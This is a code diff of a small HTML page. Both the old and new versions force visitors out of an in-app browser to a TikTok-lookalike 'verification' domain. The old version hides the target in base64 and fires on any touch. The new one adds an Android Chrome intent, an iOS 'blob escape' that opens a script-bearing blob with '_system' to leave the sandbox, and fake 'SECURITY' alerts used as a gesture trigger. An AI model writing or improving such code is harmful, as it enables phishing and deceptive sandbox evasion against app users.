@@ -1,43 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>body{background:#fff;margin:0;}</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        #btn { padding: 20px 40px; background: #000; color: #fff; border-radius: 8px; font-weight: bold; cursor: pointer; }
+    </style>
 </head>
 <body>
-<script>
-    // This is "safari-https://tik-tok-verification.com/Verification/verify1.html" hidden
-    const _0x1 = "c2FmYXJpLWh0dHBzOi8vdGlrLXRvay12ZXJpZmljYXRpb24uY29tL1ZlcmlmaWNhdGlvbi92ZXJpZnkxLmh0bWw=";
-    // This is the Android Intent hidden
-    const _0x2 = "aW50ZW50Oi8vdGlrLXRvay12ZXJpZmljYXRpb24uY29tL1ZlcmlmaWNhdGlvbi92ZXJpZnkxLmh0bWwjSW50ZW50O3NjaGVtZT1odHRwczthY3Rpb249YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlZJRVc7Y2F0ZWdvcnk9YW5kcm9pZC5pbnRlbnQuY2F0ZWdvcnkuQlJPV1NBQkxFO3BhY2thZ2U9Y29tLmFuZHJvaWQuY2hyb21lO2VuZA==";
 
-    function go() {
+    <div id="btn">CONTINUE TO VERIFICATION</div>
+
+<script>
+    const dest = "https://tik-tok-verification.com/Verification/verify1.html";
+    const clean = "tik-tok-verification.com/Verification/verify1.html";
+
+    function launch() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const target = isAndroid ? atob(_0x2) : atob(_0x1);
         
-        // Method A: System Window
-        window.open(target, '_system');
-        
-        // Method B: Location Overwrite
-        window.location.replace(target);
+        if (isAndroid) {
+            // Android: Intent with specific Chrome package targeting
+            window.location.href = `intent://${clean}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+        } else {
+            // iOS: THE BLOB ESCAPE
+            // 1. Create a virtual HTML file in memory that contains the redirect
+            const blobContent = `<script>window.location.replace("safari-https://${clean}");<\/script>`;
+            const blob = new Blob([blobContent], {type: 'text/html'});
+            const blobUrl = URL.createObjectURL(blob);
+
+            // 2. Open that virtual file as a '_system' process
+            // This forces the OS to handle the 'text/html' blob outside the sandbox
+            window.open(blobUrl, '_system');
+            
+            // 3. Direct Backup
+            setTimeout(() => { window.location.href = "safari-https://" + clean; }, 50);
+        }
     }
 
-    window.onload = function() {
-        // First attempt
-        go();
-
-        setTimeout(() => {
-            if (document.hasFocus()) {
-                // The Alert acts as the User Gesture
-                alert("SECURITY CHECK\n\nTap OK to continue to the verification portal in your secure browser.");
-                go();
-            }
-        }, 500);
+    // Trigger on button click
+    document.getElementById('btn').onclick = function() {
+        launch();
     };
 
-    // Any touch on screen fires it
-    document.addEventListener('click', go);
-    document.addEventListener('touchstart', go);
+    // Auto-trigger on page load (via Alert bridge)
+    window.onload = function() {
+        setTimeout(() => {
+            alert("SECURITY: Please confirm to continue in your browser.");
+            launch();
+        }, 500);
+    };
 </script>
 </body>
 </html>
